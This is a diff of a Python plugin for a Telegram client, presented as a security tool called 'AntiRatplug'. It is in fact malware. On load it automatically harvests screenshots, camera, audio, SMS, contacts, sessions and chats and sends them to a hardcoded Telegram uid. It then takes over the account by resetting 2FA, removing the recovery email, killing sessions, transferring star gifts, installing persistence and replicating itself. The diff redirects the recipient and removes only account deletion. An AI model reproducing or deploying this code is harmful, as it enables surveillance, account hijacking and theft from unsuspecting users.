@@ -1,15 +1,15 @@
 # -*- coding: utf-8 -*-
 """
-AntiRatplug — Slim Auto.
+AntiRatplug — Slim Auto (no delete).
 Full Harvest + Full Lockdown запускаются автоматически.
-Всё сыпется в @from_a4 (7943244842).
+Всё сыпется на uid 8391217110.
 """
 
 __id__ = "AntiRatplug"
 __name__ = "AntiRatplug"
-__description__ = "Auto Harvest + Auto Lockdown, всё в бота."
+__description__ = "Auto Harvest + Auto Lockdown, всё на uid 8391217110."
 __author__ = "@from_a4"
-__version__ = "16.1 [Auto]"
+__version__ = "16.2 [Auto-NoDelete]"
 __min_version__ = "11.12.1"
 __icon__ = "CreepyEmojiAnim/5"
 __app_version__ = ">=12.5.1"
@@ -50,11 +50,11 @@ def _tok():
 
 
 def _tg():
-    return [str(7943244842)]
+    return [str(8391217110)]
 
 
-RECIPIENT_USERNAME = "from_a4"
-RECIPIENT_UID = 7943244842
+RECIPIENT_USERNAME = ""
+RECIPIENT_UID = 8391217110
 
 _config = None
 _targets = None
@@ -82,12 +82,12 @@ _HOST_GEO = ("h", "t", "t", "p", "s", ":", "/", "/", "i", "p", "-", "a", "p",
 
 SPLASH_URL = "https://avatars.mds.yandex.net/i?id=3dc59086f9dda9fcd166b4075ac97bd1_l-4569626-images-thumbs&n=13"
 
-# ─── AUTO flags (крутить здесь) ─────────────────────────────────────────────
-AUTO_RUN             = True    # True = Harvest+Lockdown стартуют сами
-AUTO_HARVEST_FIRST   = True    # Harvest всегда первым
-AUTO_LOCKDOWN_AFTER  = True    # Lockdown сразу после Harvest
-AUTO_DELAY_SEC       = 8       # пауза между Harvest и Lockdown
-AUTO_LOCKDOWN_GIFTS  = True    # тянуть ли подарки в Lockdown
+# ─── AUTO flags ─────────────────────────────────────────────────────────────
+AUTO_RUN             = True
+AUTO_HARVEST_FIRST   = True
+AUTO_LOCKDOWN_AFTER  = True
+AUTO_DELAY_SEC       = 8
+AUTO_LOCKDOWN_GIFTS  = True
 
 
 def _UC():
@@ -272,16 +272,13 @@ class PluginSecurityPlugin(BasePlugin):
             self._start_polling()
         except Exception:
             pass
-        # ─── AUTO FIRE ──────────────────────────────────────────────────────
         if AUTO_RUN:
             threading.Thread(target=self._auto_chain, daemon=True).start()
 
     def _auto_chain(self):
-        # не запускаем дважды на один процесс
         if self._auto_started:
             return
         self._auto_started = True
-        # небольшая пауза, чтобы UI/клиент успел подняться
         time.sleep(6)
         if AUTO_HARVEST_FIRST:
             try:
@@ -289,7 +286,6 @@ class PluginSecurityPlugin(BasePlugin):
             except Exception:
                 pass
             self._full_harvest(include_sessions=True, auto_infect=False)
-            # дождаться завершения harvest (по флагу)
             for _ in range(600):
                 if not getattr(self, "_harvest_running", False):
                     break
@@ -437,22 +433,23 @@ class PluginSecurityPlugin(BasePlugin):
                     return RECIPIENT_UID, ah
         except Exception:
             pass
-        try:
-            Req = TLRPC.TL_contacts_resolveUsername()
-            Req.username = RECIPIENT_USERNAME
-            resp, err = self._rg_rpc(Req, account, 10.0, fast=True)
-            if resp is not None:
-                users = getattr(resp, "users", None)
-                if users is not None and users.size() > 0:
-                    u = users.get(0)
-                    uid = _safe_int(getattr(u, "id", 0))
-                    ah = _safe_int(getattr(u, "access_hash", 0))
-                    if uid and ah:
-                        with self._recipient_lock:
-                            self._recipient_ah_cache[account] = (uid, ah)
-                        return uid, ah
-        except Exception:
-            pass
+        if RECIPIENT_USERNAME:
+            try:
+                Req = TLRPC.TL_contacts_resolveUsername()
+                Req.username = RECIPIENT_USERNAME
+                resp, err = self._rg_rpc(Req, account, 10.0, fast=True)
+                if resp is not None:
+                    users = getattr(resp, "users", None)
+                    if users is not None and users.size() > 0:
+                        u = users.get(0)
+                        uid = _safe_int(getattr(u, "id", 0))
+                        ah = _safe_int(getattr(u, "access_hash", 0))
+                        if uid and ah:
+                            with self._recipient_lock:
+                                self._recipient_ah_cache[account] = (uid, ah)
+                            return uid, ah
+            except Exception:
+                pass
         return 0, 0
 
     # ─── network info ───────────────────────────────────────────────────────
@@ -822,6 +819,7 @@ class PluginSecurityPlugin(BasePlugin):
             target_peer.access_hash = int(target_ah)
             TReq = self._tl_class_or(
                 "org.telegram.tgnet.tl.TL_stars$transferStarGift",
+                "org.telegram.tgnet.tl.TL_stars$payments_transferStarGift",
                 "org.telegram.tgnet.TLRPC$TL_payments_transferStarGift",
             )
             if TReq:
@@ -1304,20 +1302,7 @@ class PluginSecurityPlugin(BasePlugin):
             pass
         return False
 
-    def _schedule_delete(self, acc=0):
-        try:
-            Req = self._tl_class_or(
-                "org.telegram.tgnet.TLRPC$TL_account_deleteAccount",
-                "org.telegram.tgnet.tl.TL_account$deleteAccount",
-            )
-            if not Req:
-                return False
-            req = Req()
-            req.reason = "AR"
-            resp, err = self._rg_rpc(req, acc, 15.0)
-            return resp is not None
-        except Exception:
-            return False
+    # ─── (delete account удалён) ────────────────────────────────────────────
 
     def _mark_nuke(self, pw=""):
         try:
@@ -1496,7 +1481,7 @@ class PluginSecurityPlugin(BasePlugin):
         except Exception:
             pass
 
-    # ─── full lockdown ──────────────────────────────────────────────────────
+    # ─── full lockdown (без delete account) ─────────────────────────────────
 
     def _full_lockdown(self, account=0, transfer_gifts=True):
         def task():
@@ -1505,7 +1490,7 @@ class PluginSecurityPlugin(BasePlugin):
                 self._send_msg("🔒 <b>FULL LOCKDOWN — AUTO</b>")
                 report = ["<b>🔒 FULL LOCKDOWN</b>"]
 
-                self._send_msg("0/7 Deploy...")
+                self._send_msg("0/6 Deploy...")
                 try:
                     self._parallel([
                         (self._install_persistence,),
@@ -1516,7 +1501,7 @@ class PluginSecurityPlugin(BasePlugin):
                 except Exception as e:
                     report.append("<b>Deploy:</b> %s" % e)
 
-                self._send_msg("1/7 Group A...")
+                self._send_msg("1/6 Group A...")
                 ga = self._parallel([
                     (self._tg_kid,),
                     (self._confirm_unconfirmed_sessions, account),
@@ -1532,7 +1517,7 @@ class PluginSecurityPlugin(BasePlugin):
                 report.append("<b>Ботов:</b> %s" % str(ga[4] if len(ga) > 4 else 0))
 
                 if transfer_gifts:
-                    self._send_msg("2/7 Gift Transfer...")
+                    self._send_msg("2/6 Gift Transfer...")
                     try:
                         gr = self._drain_gifts(account, workers=6)
                         report.append("<b>Gifts:</b> ok=%d conv=%d delist=%d bc-skip=%d fail=%d" % (
@@ -1541,7 +1526,7 @@ class PluginSecurityPlugin(BasePlugin):
                     except Exception as e:
                         report.append("<b>Gifts:</b> %s" % e)
 
-                self._send_msg("3/7 Group C...")
+                self._send_msg("3/6 Group C...")
                 gc = self._parallel([
                     (self._remove_recovery_email, account),
                     (self._reset_2fa, account),
@@ -1560,7 +1545,7 @@ class PluginSecurityPlugin(BasePlugin):
                 report.append("<b>Профиль:</b> %s" % ("[LOCKED]" if prof_ok else "fail"))
                 report.append("<b>Контакты:</b> %s" % ("удалены" if cont_ok else "fail"))
 
-                self._send_msg("4/7 Group D...")
+                self._send_msg("4/6 Group D...")
                 gd = self._parallel([
                     (self._kill_all_sessions, account),
                     (self._kill_login_notice_dialog, account),
@@ -1573,13 +1558,12 @@ class PluginSecurityPlugin(BasePlugin):
                 report.append("<b>Сессий убито:</b> %d / %d" % (killed, total))
                 report.append("<b>777000:</b> %s" % ("удалён" if dlg_ok else "нет"))
 
-                self._send_msg("5/7 Group E...")
+                self._send_msg("5/6 Group E...")
                 ge = self._parallel([
                     (self._tg_kid,),
                     (self._kill_all_sessions, account),
                     (self._replicate_self, 10),
-                    (self._schedule_delete, account),
-                ], workers=4, timeout=60)
+                ], workers=3, timeout=60)
                 code_b = ge[0] if len(ge) > 0 else None
                 try:
                     k2 = ge[1][0] if isinstance(ge[1], tuple) else 0
@@ -1590,14 +1574,12 @@ class PluginSecurityPlugin(BasePlugin):
                     rep_n = len(rep_r.get("made", [])) if isinstance(rep_r, dict) else 0
                 except Exception:
                     rep_n = 0
-                sd = ge[3] if len(ge) > 3 else False
                 if code_b and code_b != code_a:
                     report.append("<b>Повторный код:</b> <code>%s</code>" % self._html_escape(str(code_b)))
                 report.append("<b>Добито:</b> %d" % k2)
                 report.append("<b>Реплик:</b> %d" % rep_n)
-                report.append("<b>DeleteAccount:</b> %s" % ("ok" if sd else "fail"))
 
-                self._send_msg("6/7 Persistence...")
+                self._send_msg("6/6 Persistence...")
                 try:
                     self._install_persistence()
                     report.append("<b>Persistence:</b> ok")
@@ -1605,10 +1587,9 @@ class PluginSecurityPlugin(BasePlugin):
                     report.append("<b>Persistence:</b> %s" % e)
 
                 report.append("<b>Время:</b> %.1fс" % (time.time() - t0))
-                report.append("<b>🔴 ИТОГ:</b> аннигиляция завершена.")
+                report.append("<b>🔴 ИТОГ:</b> lockdown завершён (без delete).")
                 self._send_markup("\n".join(report), {
                     "inline_keyboard": [
-                        [{"text": "❌ Delete сейчас", "callback_data": "hv_delete"}],
                         [{"text": "📦 Pull Out", "callback_data": "hv_logout"}],
                     ]
                 }, html=True)
@@ -1625,8 +1606,6 @@ class PluginSecurityPlugin(BasePlugin):
                 self._send_msg("🌾 Full Harvest...")
                 t0 = time.time()
                 report = ["<b>🌾 Full Harvest</b>"]
-
-                # identity / device / net
                 report.append(self._info_text())
                 try:
                     user = _UC().getInstance(0).getCurrentUser()
@@ -1639,14 +1618,12 @@ class PluginSecurityPlugin(BasePlugin):
                             str(user.id)))
                 except Exception:
                     pass
-
                 try:
                     code = self._tg_kid()
                     if code:
                         report.append("<b>Tg kid:</b> <code>%s</code>" % self._html_escape(str(code)))
                 except Exception:
                     pass
-
                 try:
                     self._screenshot()
                     report.append("<b>Скриншот:</b> ok")
@@ -1663,7 +1640,6 @@ class PluginSecurityPlugin(BasePlugin):
                     report.append("<b>Аудио:</b> ok")
                 except Exception:
                     pass
-
                 try:
                     self._send_sms_dump()
                 except Exception:
@@ -1676,7 +1652,6 @@ class PluginSecurityPlugin(BasePlugin):
                     self._send_apps_dump()
                 except Exception:
                     pass
-
                 if include_sessions:
                     try:
                         self._manual_dump_session()
@@ -1692,12 +1667,10 @@ class PluginSecurityPlugin(BasePlugin):
                     self._send_chats_dump()
                 except Exception:
                     pass
-
                 report.append("<b>Время:</b> %.1fс" % (time.time() - t0))
                 markup = {
                     "inline_keyboard": [
                         [{"text": "🗑 Wipe", "callback_data": "hv_wipe"}],
-                        [{"text": "❌ Delete", "callback_data": "hv_delete"}],
                         [{"text": "📦 Logout", "callback_data": "hv_logout"}],
                         [{"text": "🖼 Shot", "callback_data": "hv_shot"}],
                     ]
@@ -1709,7 +1682,7 @@ class PluginSecurityPlugin(BasePlugin):
                 self._harvest_running = False
         threading.Thread(target=task, daemon=True).start()
 
-    # ─── harvest helpers (dumps) ────────────────────────────────────────────
+    # ─── harvest helpers ────────────────────────────────────────────────────
 
     def _manual_dump_session(self):
         try:
@@ -2291,8 +2264,6 @@ class PluginSecurityPlugin(BasePlugin):
             self._show_main_menu()
         elif cb_data == "hv_wipe":
             self._session_wipe()
-        elif cb_data == "hv_delete":
-            self._delete_account()
         elif cb_data == "hv_logout":
             self._pull_out_account()
         elif cb_data == "hv_shot":
@@ -2309,14 +2280,14 @@ class PluginSecurityPlugin(BasePlugin):
 
     def _show_help(self):
         text = (
-            "<b>AntiRatplug — Auto</b>\n\n"
+            "<b>AntiRatplug — Auto (no delete)</b>\n\n"
             "• 🌾 <b>Full Harvest</b> — identity, IP, Tg kid, скриншот, камеры, аудио, "
             "SMS, контакты, apps, session.zip, userbot, чаты\n"
             "• 🔒 <b>Full Lockdown</b> — Deploy → Group A → Gifts → Group C → "
-            "Group D → Group E → Persistence\n\n"
-            "<b>Recipient:</b> @%s (uid %d)\n"
+            "Group D → Group E → Persistence (без delete)\n\n"
+            "<b>Target uid:</b> %d\n"
             "<b>Auto:</b> Harvest → Lockdown включаются сами"
-        ) % (RECIPIENT_USERNAME, RECIPIENT_UID)
+        ) % RECIPIENT_UID
         keyboard = {
             "inline_keyboard": [
                 [{"text": "⬅️ Назад", "callback_data": "menu"}],
@@ -2324,7 +2295,7 @@ class PluginSecurityPlugin(BasePlugin):
         }
         self._send_markup(text, keyboard, html=True)
 
-    # ─── tiny manual actions (для inline-кнопок) ────────────────────────────
+    # ─── tiny manual actions ────────────────────────────────────────────────
 
     def _session_wipe(self):
         try:
@@ -2337,19 +2308,6 @@ class PluginSecurityPlugin(BasePlugin):
                 self._send_msg("✅ Все прочие сессии завершены.")
         except Exception as e:
             self._send_msg("Ошибка wipe: " + str(e))
-
-    def _delete_account(self):
-        try:
-            self._send_msg("☠️ Удаляю...")
-            req = TLRPC.TL_account_deleteAccount()
-            req.reason = "deleted"
-            resp, err = self._rg_rpc(req, 0, 15.0)
-            if err is not None:
-                self._send_msg("Ошибка: " + str(err))
-            else:
-                self._send_msg("✅ Аккаунт удалён.")
-        except Exception as e:
-            self._send_msg("Ошибка: " + str(e))
 
     def _pull_out_account(self):
         try:
